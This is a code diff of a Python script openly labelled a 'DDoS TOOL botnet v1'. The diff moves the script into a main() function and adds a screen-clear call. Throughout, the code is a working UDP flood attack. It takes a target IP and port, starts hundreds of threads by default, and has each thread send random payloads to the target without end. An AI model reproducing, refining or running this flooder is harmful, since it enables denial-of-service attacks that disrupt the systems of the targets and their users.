@@ -3,41 +3,49 @@ import socket
 import threading
 import random
 import time
+import os
 
-print("\033[92m")
-print("╔══════════════════════════════════════════════╗")
-print("║          LINUXSQUAD DDoS TOOL                ║")
-print("║               botnet v1                      ║")
-print("╚══════════════════════════════════════════════╝")
-print("\033[0m")
+def main():
+    os.system("clear")  
 
-if len(sys.argv) < 3:
-    print("\033[93mUsage: python ddos.py <IP> <PORT> [THREADS]\033[0m")
-    print("Example: python ddos.py 192.168.1.1 80 600")
-    sys.exit(1)
+    print("\033[92m")
+    print("╔══════════════════════════════════════════════╗")
+    print("║          LINUXSQUAD DDoS TOOL                ║")
+    print("║               botnet v1                      ║")
+    print("╚══════════════════════════════════════════════╝")
+    print("\033[0m")
 
-target = sys.argv[1]
-port = int(sys.argv[2])
-threads = int(sys.argv[3]) if len(sys.argv) > 3 else 600
+    if len(sys.argv) < 3:
+        print("\033[93mUsage: python ddos.py <IP> <PORT> [THREADS]\033[0m")
+        print("Example: python ddos.py 192.168.1.1 80 600")
+        sys.exit(1)
 
-print(f"\033[91m[+] Attack starting → {target}:{port}\033[0m")
-print(f"\033[92m[+] {threads} threads running... (Ctrl+C to stop)\033[0m")
+    target = sys.argv[1]
+    port = int(sys.argv[2])
+    threads = int(sys.argv[3]) if len(sys.argv) > 3 else 600
 
-def flood():
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    while True:
-        try:
-            payload = random.randbytes(random.randint(512, 2048))
-            sock.sendto(payload, (target, port))
-        except:
-            pass
+    print(f"\033[91m[+] Attack starting → {target}:{port}\033[0m")
+    print(f"\033[92m[+] {threads} threads running... (Ctrl+C to stop)\033[0m")
 
-for _ in range(threads):
-    t = threading.Thread(target=flood, daemon=True)
-    t.start()
+    def flood():
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        while True:
+            try:
+                payload = random.randbytes(random.randint(512, 2048))
+                sock.sendto(payload, (target, port))
+            except:
+                pass
 
-try:
-    while True:
-        time.sleep(5)
-except KeyboardInterrupt:
-    print("\n\033[91m[-] Attack stopped.\033[0m")
+    for _ in range(threads):
+        t = threading.Thread(target=flood, daemon=True)
+        t.start()
+
+    try:
+        while True:
+            time.sleep(5)
+    except KeyboardInterrupt:
+        print("\n\033[91m[-] Attack stopped.\033[0m")
+
+
+if __name__ == "__main__":
+    main()
